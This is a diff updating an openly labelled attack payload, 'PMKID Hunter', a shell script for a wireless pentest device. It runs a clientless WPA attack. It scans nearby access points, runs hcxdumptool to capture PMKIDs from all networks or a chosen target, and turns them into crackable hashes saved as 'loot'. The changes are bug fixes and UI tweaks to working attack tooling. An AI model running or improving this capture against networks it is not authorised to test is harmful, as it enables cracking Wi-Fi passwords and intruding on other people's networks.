@@ -2,7 +2,7 @@
 # Title: PMKID Hunter
 # Description: Clientless WPA attack - capture PMKIDs without waiting for handshakes
 # Author: JMFH / FENRIR / HaleHound
-# Version: 1.0.2
+# Version: 1.0.3
 # Category: user/attack
 # Requires: hcxdumptool, hcxpcapngtool (hcxtools)
 #
@@ -88,7 +88,7 @@ install_tools() {
     opkg install hcxdumptool >/dev/null 2>&1
     opkg install hcxtools >/dev/null 2>&1
 
-    STOP_SPINNER $spinner_id
+    STOP_SPINNER "$spinner_id"
 
     if check_tools; then
         LOG "Tools installed successfully"
@@ -127,7 +127,7 @@ scan_targets() {
 
     local json=$(_pineap RECON APS limit=30 format=json)
 
-    STOP_SPINNER $spinner_id
+    STOP_SPINNER "$spinner_id"
 
     AP_MACS=()
     AP_SSIDS=()
@@ -163,7 +163,7 @@ show_target() {
     LOG "${AP_MACS[$SELECTED]}"
     LOG "Channel: ${AP_CHANNELS[$SELECTED]}"
     LOG ""
-    LOG "UP/DOWN=Scroll A=Select"
+    LOG "UP/DOWN=Scroll A=Select B=Back"
 }
 
 select_target() {
@@ -185,6 +185,9 @@ select_target() {
                 ;;
             A)
                 return 0
+                ;;
+            B|BACK)
+                return 1
                 ;;
         esac
     done
@@ -229,13 +232,9 @@ capture_pmkid() {
     local cmd="hcxdumptool -i $INTERFACE -w $capfile --rds=1"
 
     if [ "$mode" = "targeted" ]; then
-        # Create BPF filter for target MAC
-        local mac_clean=$(echo "$target_mac" | tr -d ':' | tr '[:upper:]' '[:lower:]')
-        hcxdumptool --bpfc="wlan addr3 $mac_clean" > "$bpffile" 2>/dev/null
-
-        if [ -f "$bpffile" ] && [ -s "$bpffile" ]; then
-            cmd="$cmd --bpf=$bpffile"
-        fi
+        # Create filter file for target MAC
+        echo "$target_mac" > "$bpffile"
+        cmd="$cmd --filterlist_ap=$bpffile --filtermode=2"
 
         # Lock to target channel (add band indicator)
         if [ -n "$target_channel" ]; then
@@ -296,7 +295,7 @@ capture_pmkid() {
         fi
 
         local remaining=$((duration - elapsed))
-        printf "\r[%3ds] Hunting PMKIDs... (%d captured)" $remaining $pmkid_count
+        LOG "[${remaining}s] Hunting PMKIDs... ($pmkid_count captured)"
 
         sleep 1
         elapsed=$((elapsed + 1))
@@ -325,7 +324,7 @@ capture_pmkid() {
 
     hcxpcapngtool -o "$hashfile" -E "$LOOTDIR/essid_${timestamp}.txt" "$capfile" 2>/tmp/convert_status
 
-    STOP_SPINNER $spinner_id
+    STOP_SPINNER "$spinner_id"
 
     # Count results
     local hash_count=0
@@ -415,7 +414,7 @@ if ! check_tools; then
             ;;
     esac
 
-    if [ "$install_confirm" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
+    if [ "$install_confirm" = "1" ]; then
         if ! install_tools; then
             ERROR_DIALOG "Failed to install tools\n\nTry manually:\nopkg update\nopkg install hcxdumptool hcxtools"
             exit 1
@@ -452,7 +451,7 @@ TARGET_MODE="all"
 TARGET_MAC=""
 TARGET_CHANNEL=""
 
-if [ "$mode_choice" = "$DUCKYSCRIPT_USER_DENIED" ]; then
+if [ "$mode_choice" != "1" ]; then
     TARGET_MODE="targeted"
 
     # Scan for targets
@@ -462,7 +461,10 @@ if [ "$mode_choice" = "$DUCKYSCRIPT_USER_DENIED" ]; then
     fi
 
     # Let user pick target
-    select_target
+    if ! select_target; then
+        LOG "Cancelled"
+        exit 0
+    fi
 
     TARGET_MAC="${AP_MACS[$SELECTED]}"
     TARGET_CHANNEL="${AP_CHANNELS[$SELECTED]}"
@@ -514,7 +516,7 @@ case $? in
         ;;
 esac
 
-if [ "$confirm" = "$DUCKYSCRIPT_USER_DENIED" ]; then
+if [ "$confirm" != "1" ]; then
     LOG "Cancelled by user"
     exit 0
 fi
